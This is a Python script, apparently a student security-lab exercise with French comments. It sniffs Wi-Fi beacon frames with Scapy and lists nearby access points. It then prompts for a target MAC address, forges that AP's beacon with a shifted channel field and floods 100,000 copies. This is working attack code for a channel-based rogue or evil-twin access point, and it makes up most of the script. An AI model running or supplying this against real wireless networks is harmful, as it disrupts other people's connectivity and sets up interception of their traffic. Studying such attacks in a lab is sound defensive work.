#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Script baser sur le site suivant : https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy

Auteurs : Polier Florian, Tran Eric
Date : 08.03.2020
"""
from scapy.all import *
from threading import Thread
import pandas
import time
import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("interface", help="network interface")
parser.add_argument("seconds", help="time in seconds to sniff before selecting", type=int)
args = parser.parse_args()
counter = 0

# On fait un dataframe pour un affichage plus pertinent
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Beacon"])
# Un AP est identifié par son BSSID donc on le met en index
networks.set_index("BSSID", inplace=True)

def callback(packet):
    global counter
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode('utf-8')
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        networks.loc[bssid] = (ssid, dbm_signal, channel, packet)


# Routine d'affichage que l'on arrête grâce au flag stop_print
def print_all():
    global stop_print
    while True:
        if stop_print:
            break;
        os.system("clear")
        print(networks[["SSID","Channel", "dBm_Signal"]])
        time.sleep(0.5)


# Channel hopping pour gagner en efficacité
def change_channel():
    ch = 1
    while True:
        # Changement de channel de l'interface à l'aide de la commande système iwconfig
        os.system("iwconfig " + args.interface + " channel " + str(ch))
        ch = ch % 14 + 1
        time.sleep(0.5)


if __name__ == "__main__":
    stop_print=False

    # Initialisation du thread d'affichage
    printer = Thread(target=print_all)
    # La flag daemon permet au programme de s'arrêter même si des threads daemon sont encore en cours
    printer.daemon = True
    printer.start()

    # Initialisation du thread de channel hopping
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # Démarrage du sniff (bloquanr) qui s'arrêtera après le nombre de secondes donné en argument
    sniff(prn=callback, iface=args.interface, timeout=args.seconds)
    stop_print = True

    # On affiche à nouveau le tableau proprement
    time.sleep(0.5)
    os.system("clear")
    print(networks[["SSID", "Channel", "dBm_Signal"]])

    input = raw_input("\nChoisir un AP a attaquer via son adresse MAC: ")

    # On récupère les infos sur l'AP à attaquer grâce à l'input utilisateur
    try:
        APToAttack = networks.loc[input , : ]
    except:
        print "L'AP demandé n'existe pas."
        sys.exit()

    # On décale le channel du beacon comme demandé
    ChannelToAttack = (APToAttack.Channel + 6) % 14

    # Découpage du paquet : On va récupérer les couches supérieures et inférieurs à celle de la channel et la recréer dans un nouveau paquet
    post = APToAttack.Beacon.getlayer(6)
    APToAttack.Beacon.getlayer(4).remove_payload()
    # C'est ici qu'on recrée la couche de la channel
    forged = APToAttack.Beacon / Dot11Elt(ID="DSset", len=1, info=chr(ChannelToAttack)) / post
    sendp(forged, count=100000, iface=args.interface)